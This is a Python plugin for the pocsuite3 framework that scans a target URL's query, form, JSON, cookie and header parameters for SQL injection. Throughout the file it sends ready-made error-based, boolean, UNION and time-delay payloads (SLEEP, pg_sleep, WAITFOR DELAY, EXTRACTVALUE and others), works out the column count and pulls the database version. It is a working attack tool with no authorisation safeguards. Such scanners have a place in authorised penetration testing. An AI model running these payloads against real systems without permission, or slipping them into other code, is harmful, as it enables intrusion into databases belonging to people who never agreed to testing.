#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, OptString, OptDict
from pocsuite3.api import requests
from urllib.parse import urlparse, parse_qs, quote, urlencode
import time
import json
import hashlib
import statistics
import random
import string
import difflib
from enum import Enum
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class ParamType(Enum):
    GET = 'get'
    POST = 'post'
    JSON = 'json'
    COOKIE = 'cookie'
    HEADER = 'header'


class TimeoutResponse:
    """模拟超时响应对象"""
    def __init__(self, timeout):
        self.timeout = timeout
        self.status_code = 408
        self.content = b''
        self.text = ''

    def __bool__(self):
        return False


class SQLInjector(POCBase):
    name = 'SQL注入探测器'

    # ---------- 常量定义 ----------
    # 报错注入payload（增强）
    ERROR_PAYLOADS = [
        ("' AND 1=CAST('test' AS INT) -- ", "MySQL CAST error"),
        ("' OR 1=CONVERT(int, @@version) -- ", "MySQL CONVERT error"),
        ("' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version)) -- ", "MySQL XPATH error"),
        ("' AND 1=CONVERT(int, @@version) -- ", "SQL Server convert error"),
        ("' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1)) -- ", "Oracle CTXSYS error"),
        ("' AND 1=CAST('test' AS INT) -- ", "PostgreSQL CAST error"),
        ("' AND 1=randomblob(1000000000) -- ", "SQLite randomblob"),
        ("' AND GTID_SUBSET(CONCAT('~',(SELECT @@version),'~'),1) -- ", "MySQL GTID error"),
        ("' AND 1=dbms_pipe.receive_message(('a'),10) -- ", "Oracle pipe error"),
        ("' AND 1=pg_sleep(10) -- ", "PostgreSQL pg_sleep in error context"),
        # 通用错误关键词
        ("'", "single quote syntax error"),
        ("\"", "double quote syntax error"),
    ]

    # 布尔注入测试对（增强）
    BOOLEAN_TESTS = [
        ("1 AND 1=1 -- ", "1 AND 1=2 -- "),
        ("1' AND '1'='1' -- ", "1' AND '1'='2' -- "),
        ('1" AND "1"="1" -- ', '1" AND "1"="2" -- '),
        ("1') AND ('1'='1", "1') AND ('1'='2"),
        ('1") AND ("1"="1', '1") AND ("1"="2'),
        ("1 AND 1=1#", "1 AND 1=2#"),
        ("1' AND '1'='1'%23", "1' AND '1'='2'%23"),
    ]

    # 联合查询前缀后缀组合
    UNION_PREFIXES = [
        ("1' ", " -- "),
        ('1" ', " -- "),
        ("1') ", " -- "),
        ('1") ', " -- "),
        ("1 ", " -- "),
        ("1' /*!12345", "*/ -- "),
    ]

    # 时间盲注payload
    TIME_PAYLOADS = [
        ("1' AND SLEEP(5) -- ", "1' AND SLEEP(0) -- ", 5, "MySQL SLEEP"),
        ("1' AND pg_sleep(5) -- ", "1' AND pg_sleep(0) -- ", 5, "PostgreSQL pg_sleep"),
        ("1'; WAITFOR DELAY '00:00:05' -- ", "1'; WAITFOR DELAY '00:00:00' -- ", 5, "SQL Server WAITFOR"),
        ("1' AND BENCHMARK(5000000,MD5('a')) -- ", "1' AND 1=2 -- ", 5, "MySQL BENCHMARK"),
    ]

    # 数据库错误关键字映射
    DB_ERROR_KEYWORDS = {
        'mysql': ['mysql', 'mariadb', 'driver', 'sql syntax', 'incorrect syntax near'],
        'oracle': ['oracle', 'pl/sql', 'ora-'],
        'mssql': ['sql server', 'microsoft ole db', 'odbc', 'line'],
        'postgresql': ['postgresql', 'pg_', 'psycopg2'],
        'sqlite': ['sqlite', 'sqlite3'],
    }

    # 版本提取正则
    VERSION_REGEX = {
        'mysql': r'([0-9]+[.][0-9]+[.][0-9]+[^ \'"]*)',
        'mssql': r'([0-9]+[.][0-9]+[.][0-9]+[^ \'"]*)',
        'oracle': r'(Oracle[^<]+)',
        'postgresql': r'([0-9]+[.][0-9]+[.][0-9]+[^ \'"]*)',
        'sqlite': r'([0-9]+[.][0-9]+[.][0-9]+[^ \'"]*)',
    }

    def _options(self):
        return {
            'request_method': OptString('GET', '请求方法: GET/POST'),
            'request_data': OptString('', 'POST数据 (key1=value1&key2=value2 或 JSON)'),
            'headers': OptString('{}', '自定义Headers (JSON格式)'),
            'cookies': OptString('{}', '自定义Cookies (JSON格式)'),
            'timeout': OptString('10', '请求超时(秒)'),
            'time_delay': OptString('5', '时间盲注延迟秒数'),
            'enable_error': OptString('true', '启用报错注入检测'),
            'enable_boolean': OptString('true', '启用布尔注入检测'),
            'enable_union': OptString('true', '启用联合查询检测'),
            'enable_time': OptString('true', '启用时间盲注检测'),
            'similarity_threshold': OptString('0.9', '布尔注入文本相似度阈值 (0-1)'),
            'max_retries': OptString('2', '请求失败最大重试次数'),
        }

    def _verify(self):
        method = self.get_option('request_method').upper()
        data_str = self.get_option('request_data')
        self.headers = json.loads(self.get_option('headers') or '{}')
        self.cookies = json.loads(self.get_option('cookies') or '{}')
        self.timeout = int(self.get_option('timeout'))
        self.time_delay = int(self.get_option('time_delay'))
        self.enable_error = self.get_option('enable_error').lower() == 'true'
        self.enable_boolean = self.get_option('enable_boolean').lower() == 'true'
        self.enable_union = self.get_option('enable_union').lower() == 'true'
        self.enable_time = self.get_option('enable_time').lower() == 'true'
        self.similarity_threshold = float(self.get_option('similarity_threshold'))
        self.max_retries = int(self.get_option('max_retries'))

        url = self.url
        parsed = urlparse(url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        test_points = self._collect_test_points(parsed, data_str, method)
        if not test_points:
            return self._fail("没有找到可测试的参数")

        for point in test_points:
            self._debug(f"测试参数: {point['type']}:{point.get('name') or point.get('path','unknown')}")
            baseline = self._measure_baseline(point)
            if baseline is None:
                self._debug("无法获取基准响应，跳过")
                continue

            result = self._test_all_injections(point, baseline)
            if result:
                return result

        return self._fail("未发现SQL注入漏洞")

    # ---------- 辅助方法 ----------
    def _debug(self, msg):
        """调试输出，可根据需要启用"""
        # print(f"[DEBUG] {msg}")
        pass

    def _collect_test_points(self, parsed, data_str, method):
        points = []
        # GET参数
        get_params = parse_qs(parsed.query, keep_blank_values=True)
        for name, values in get_params.items():
            for val in values:
                points.append({
                    'type': ParamType.GET.value,
                    'name': name,
                    'value': val,
                    'container': get_params.copy(),
                })

        # POST参数
        if method == 'POST' and data_str:
            if '=' in data_str and not data_str.strip().startswith('{'):
                post_params = parse_qs(data_str, keep_blank_values=True)
                for name, values in post_params.items():
                    for val in values:
                        points.append({
                            'type': ParamType.POST.value,
                            'name': name,
                            'value': val,
                            'container': post_params.copy(),
                        })
            elif data_str.strip().startswith('{'):
                try:
                    json_data = json.loads(data_str)
                    self._extract_json_strings('', json_data, points)
                except:
                    pass

        # Cookie参数
        for name, value in self.cookies.items():
            points.append({
                'type': ParamType.COOKIE.value,
                'name': name,
                'value': value,
                'container': self.cookies.copy(),
            })

        # Header参数
        header_names = ['User-Agent', 'X-Forwarded-For', 'Referer']
        for name in header_names:
            if name in self.headers:
                points.append({
                    'type': ParamType.HEADER.value,
                    'name': name,
                    'value': self.headers[name],
                    'container': self.headers.copy(),
                })

        return points

    def _extract_json_strings(self, prefix, obj, points):
        if isinstance(obj, dict):
            for k, v in obj.items():
                new_prefix = f"{prefix}.{k}" if prefix else k
                self._extract_json_strings(new_prefix, v, points)
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                new_prefix = f"{prefix}[{i}]"
                self._extract_json_strings(new_prefix, v, points)
        elif isinstance(obj, str):
            points.append({
                'type': ParamType.JSON.value,
                'path': prefix,
                'value': obj,
                'container': None  # 动态构造
            })

    def _send_request(self, point, test_value, timeout=None, retry=0):
        if timeout is None:
            timeout = self.timeout
        try:
            req_kwargs = {
                'headers': self.headers.copy(),
                'cookies': self.cookies.copy(),
                'timeout': timeout,
                'allow_redirects': False,
                'verify': False
            }

            ptype = point['type']
            # 根据参数类型对payload进行必要编码
            encoded_value = test_value
            if ptype == ParamType.GET.value:
                # GET参数通过params传递，requests会自动URL编码
                params = point['container'].copy()
                params[point['name']] = [encoded_value]
                resp = requests.get(self.base_url, params=params, **req_kwargs)
            elif ptype == ParamType.POST.value:
                data = point['container'].copy()
                data[point['name']] = [encoded_value]
                resp = requests.post(self.base_url, data=data, **req_kwargs)
            elif ptype == ParamType.JSON.value:
                original_data = self.get_option('request_data')
                json_data = json.loads(original_data)
                # 确保路径存在，若不存在则跳过
                if not self._set_json_value(json_data, point['path'], encoded_value):
                    self._debug(f"JSON路径 {point['path']} 不存在，跳过")
                    return None
                resp = requests.post(self.base_url, json=json_data, **req_kwargs)
            elif ptype == ParamType.COOKIE.value:
                # Cookie值需URL编码，避免特殊字符导致请求头错误
                cookies = point['container'].copy()
                cookies[point['name']] = quote(encoded_value, safe='')
                req_kwargs['cookies'] = cookies
                resp = requests.get(self.base_url, **req_kwargs)
            elif ptype == ParamType.HEADER.value:
                headers = point['container'].copy()
                # 检查并移除可能的换行符
                headers[point['name']] = encoded_value.replace('\r', '').replace('\n', '')
                req_kwargs['headers'] = headers
                resp = requests.get(self.base_url, **req_kwargs)
            else:
                return None

            return resp
        except requests.exceptions.Timeout:
            return TimeoutResponse(timeout)
        except (requests.exceptions.ConnectionError, requests.exceptions.SSLError) as e:
            self._debug(f"网络异常: {e}")
            if retry < self.max_retries:
                time.sleep(1)
                return self._send_request(point, test_value, timeout, retry+1)
            return None
        except Exception as e:
            self._debug(f"请求异常: {e}")
            return None

    def _set_json_value(self, obj, path, value):
        """安全设置JSON值，支持嵌套路径；返回是否成功"""
        parts = path.split('.')
        try:
            for i, part in enumerate(parts[:-1]):
                if '[' in part and ']' in part:
                    name, idx = part.split('[')
                    idx = int(idx.rstrip(']'))
                    obj = obj[name][idx]
                else:
                    obj = obj[part]
            last = parts[-1]
            if '[' in last and ']' in last:
                name, idx = last.split('[')
                idx = int(idx.rstrip(']'))
                obj[name][idx] = value
            else:
                obj[last] = value
            return True
        except (KeyError, IndexError, TypeError):
            # 路径不存在，返回False
            return False

    def _measure_baseline(self, point):
        """测量基准响应（多次取中位数时间和响应特征），带重试"""
        times = []
        responses = []
        for attempt in range(3):
            start = time.time()
            resp = self._send_request(point, point['value'])
            if resp and not isinstance(resp, TimeoutResponse):
                times.append(time.time() - start)
                responses.append(resp)
                break  # 一次成功即可，但为了稳定性可继续取多次
        if not times:
            return None
        # 取第一个正常响应作为内容特征
        ref = responses[0]
        return {
            'median_time': times[0],  # 仅用一次时间作为基准，简化
            'status': ref.status_code,
            'length': len(ref.content),
            'text': ref.text.lower(),
            'hash': hashlib.md5(ref.content).hexdigest()
        }

    # ---------- 综合测试入口 ----------
    def _test_all_injections(self, point, baseline):
        if self.enable_error:
            result = self._test_error_based(point, baseline)
            if result:
                return self._success("error injection", point, result)

        if self.enable_boolean:
            result = self._test_boolean(point, baseline)
            if result:
                return self._success("boolean injection", point, result)

        if self.enable_union:
            result = self._test_union_based(point, baseline)
            if result:
                return self._success("union injection", point, result)

        if self.enable_time:
            result = self._test_time_based(point, baseline)
            if result:
                return self._success("time injection", point, result)

        return None

    # ---------- 报错注入 ----------
    def _test_error_based(self, point, baseline):
        normal_text = baseline['text']
        normal_status = baseline['status']

        for payload, desc in self.ERROR_PAYLOADS:
            resp = self._send_request(point, payload)
            if not resp or isinstance(resp, TimeoutResponse):
                continue
            text = resp.text.lower()
            status = resp.status_code

            # 状态码变化
            if status >= 500 and normal_status < 500:
                return {"payload": payload, "reason": "HTTP 500 error"}

            # 错误关键字检测
            for db, keywords in self.DB_ERROR_KEYWORDS.items():
                for kw in keywords:
                    if kw in text and kw not in normal_text:
                        return {
                            "payload": payload,
                            "error_keyword": kw,
                            "database": db
                        }
        return None

    # ---------- 布尔注入（增强相似度比较）----------
    def _test_boolean(self, point, baseline):
        def get_features(resp):
            if not resp or isinstance(resp, TimeoutResponse):
                return None
            return {
                'status': resp.status_code,
                'length': len(resp.content),
                'hash': hashlib.md5(resp.content).hexdigest(),
                'text': resp.text.lower()
            }

        for true_p, false_p in self.BOOLEAN_TESTS:
            true_resp = self._send_request(point, true_p)
            false_resp = self._send_request(point, false_p)
            true_feat = get_features(true_resp)
            false_feat = get_features(false_resp)
            if not true_feat or not false_feat:
                continue

            diff_reasons = []
            if true_feat['status'] != false_feat['status']:
                diff_reasons.append('status_code')
            if true_feat['length'] != false_feat['length']:
                diff_reasons.append('content_length')
            if true_feat['hash'] != false_feat['hash']:
                diff_reasons.append('content_hash')

            if not diff_reasons:
                # 计算文本相似度
                similarity = difflib.SequenceMatcher(None, true_feat['text'], false_feat['text']).ratio()
                if similarity < self.similarity_threshold:
                    diff_reasons.append(f'text_similarity:{similarity:.3f}')

                # 关键词差异检测
                error_keywords = ['error', 'warning', 'mysql', 'sql', 'syntax']
                true_error_count = sum(1 for kw in error_keywords if kw in true_feat['text'])
                false_error_count = sum(1 for kw in error_keywords if kw in false_feat['text'])
                if true_error_count != false_error_count:
                    diff_reasons.append('error_keyword_count')

            if diff_reasons:
                return {
                    "true_payload": true_p,
                    "false_payload": false_p,
                    "differences": diff_reasons
                }
        return None

    # ---------- 联合查询（增强列数探测）----------
    def _test_union_based(self, point, baseline):
        """使用ORDER BY和NULL联合探测列数"""
        def find_columns_order_by():
            # 先用ORDER BY探测
            low, high = 1, 20
            while low <= high:
                mid = (low + high) // 2
                payload = f"1' ORDER BY {mid} -- "
                resp = self._send_request(point, payload)
                if resp and not isinstance(resp, TimeoutResponse) and resp.status_code < 400:
                    # 未报错，说明列数 >= mid
                    low = mid + 1
                else:
                    high = mid - 1
            return high

        def find_columns_union():
            # 二分法用UNION SELECT NULL探测
            low, high = 1, 20
            while low <= high:
                mid = (low + high) // 2
                nulls = ",".join(["NULL"] * mid)
                for prefix, suffix in self.UNION_PREFIXES:
                    payload = f"{prefix}UNION SELECT {nulls}{suffix}"
                    resp = self._send_request(point, payload)
                    if resp and not isinstance(resp, TimeoutResponse) and resp.status_code < 400:
                        # 可能成功，尝试更大的列数
                        low = mid + 1
                        break
                else:
                    # 所有前缀都失败，说明列数太多，减小high
                    high = mid - 1
            return high

        # 优先用ORDER BY探测，若无结果再用UNION探测
        max_cols = find_columns_order_by()
        if max_cols < 1:
            max_cols = find_columns_union()
        if max_cols < 1:
            return None

        # 生成随机字符串用于标记
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        for col in range(1, max_cols+1):
            cols = []
            for i in range(1, max_cols+1):
                if i == col:
                    cols.append(f"'{rand_str}'")
                else:
                    cols.append("NULL")
            union_cols = ",".join(cols)
            for prefix, suffix in self.UNION_PREFIXES:
                payload = f"{prefix}UNION SELECT {union_cols}{suffix}"
                resp = self._send_request(point, payload)
                if resp and not isinstance(resp, TimeoutResponse) and resp.status_code < 400:
                    if rand_str in resp.text:
                        return {
                            "payload": payload,
                            "columns": max_cols,
                            "display_column": col,
                            "marker": rand_str
                        }
        return None

    # ---------- 时间盲注（动态采样）----------
    def _test_time_based(self, point, baseline):
        def measure_time(payload, expected_delay, quick=False):
            samples = 2 if quick else 4
            times = []
            for _ in range(samples):
                start = time.time()
                resp = self._send_request(point, payload, timeout=expected_delay+3)
                if isinstance(resp, TimeoutResponse):
                    times.append(expected_delay + 1)
                elif resp is not None:
                    times.append(time.time() - start)
                else:
                    times.append(0)
                time.sleep(0.2)  # 短暂间隔避免请求过快
            return statistics.median(times)

        for payload, false_p, delay, db_type in self.TIME_PAYLOADS:
            # 快速预检：2次采样，如果无明显差异则跳过
            true_quick = measure_time(payload, delay, quick=True)
            false_quick = measure_time(false_p, 0, quick=True)
            if true_quick <= false_quick + 1 or true_quick <= baseline['median_time'] + 1:
                continue

            # 详细检测：4次采样取中位数
            true_median = measure_time(payload, delay, quick=False)
            false_median = measure_time(false_p, 0, quick=False)

            if (true_median > false_median + 1 and
                true_median > baseline['median_time'] + 1 and
                true_median >= delay * 0.7):
                return {
                    "payload": payload,
                    "true_median": f"{true_median:.2f}s",
                    "false_median": f"{false_median:.2f}s",
                    "baseline": f"{baseline['median_time']:.2f}s",
                    "db_type": db_type,
                    "delay": delay
                }
        return None

    # ---------- 增强指纹识别 ----------
    def _fingerprint(self, point, vuln_info):
        """根据数据库类型尝试多种方式获取版本"""
        db_type = vuln_info.get('database', 'unknown')
        version = None

        # 定义不同数据库的版本获取payload（多种尝试）
        payloads_by_db = {
            'mysql': [
                ("1' UNION SELECT @@version -- ", "union"),
                ("1' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1) -- ", "error"),
                ("1' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version)) -- ", "error"),
            ],
            'mssql': [
                ("1' UNION SELECT @@version -- ", "union"),
                ("1' AND 1=CONVERT(int, @@version) -- ", "error"),
            ],
            'oracle': [
                ("1' UNION SELECT banner FROM v$version WHERE rownum=1 -- ", "union"),
                ("1' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1)) -- ", "error"),
            ],
            'postgresql': [
                ("1' UNION SELECT version() -- ", "union"),
                ("1' AND 1=CAST(version() AS INT) -- ", "error"),
            ],
            'sqlite': [
                ("1' UNION SELECT sqlite_version() -- ", "union"),
                ("1' AND 1=randomblob(1000000) -- ", "error"),
            ],
        }

        if db_type in payloads_by_db:
            for payload, method in payloads_by_db[db_type]:
                resp = self._send_request(point, payload)
                if resp and not isinstance(resp, TimeoutResponse):
                    text = resp.text
                    # 尝试用正则提取版本
                    if db_type in self.VERSION_REGEX:
                        import re
                        match = re.search(self.VERSION_REGEX[db_type], text, re.IGNORECASE)
                        if match:
                            version = match.group(1)
                            break
                    # 如果没有正则匹配，取前200字符作为指纹
                    if not version:
                        version = text[:200].strip()
                    if version:
                        break
        return version

    # ---------- 输出封装（增强示例）----------
    def _success(self, vuln_type, point, details):
        output = Output(self)
        param_name = point.get('name') or point.get('path', 'unknown')
        result = {
            'vulnerable': True,
            'type': vuln_type,
            'parameter': param_name,
            'location': point['type'],
            'confidence': 'high'  # 可基于检测类型调整
        }
        result.update(details)

        # 尝试获取指纹
        fingerprint = self._fingerprint(point, details)
        if fingerprint:
            result['fingerprint'] = fingerprint

        # 生成请求示例
        example = self._build_request_example(point, details.get('payload', ''))
        if example:
            result['request_example'] = example

        output.success(result)
        return output

    def _build_request_example(self, point, payload):
        """构造注入后的请求示例"""
        base = self.base_url
        ptype = point['type']
        if ptype == ParamType.GET.value:
            params = point['container'].copy()
            params[point['name']] = [payload]
            query = urlencode(params, doseq=True)
            return f"{base}?{query}"
        elif ptype == ParamType.POST.value:
            data = point['container'].copy()
            data[point['name']] = [payload]
            return f"POST {base} Data: {urlencode(data, doseq=True)}"
        elif ptype == ParamType.JSON.value:
            return f"POST {base} JSON with {point['path']} = {payload}"
        elif ptype == ParamType.COOKIE.value:
            return f"GET {base} Cookie: {point['name']}={payload}"
        elif ptype == ParamType.HEADER.value:
            return f"GET {base} Header: {point['name']}={payload}"
        return None

    def _fail(self, reason):
        output = Output(self)
        output.fail(reason)
        return output


register_poc(SQLInjector)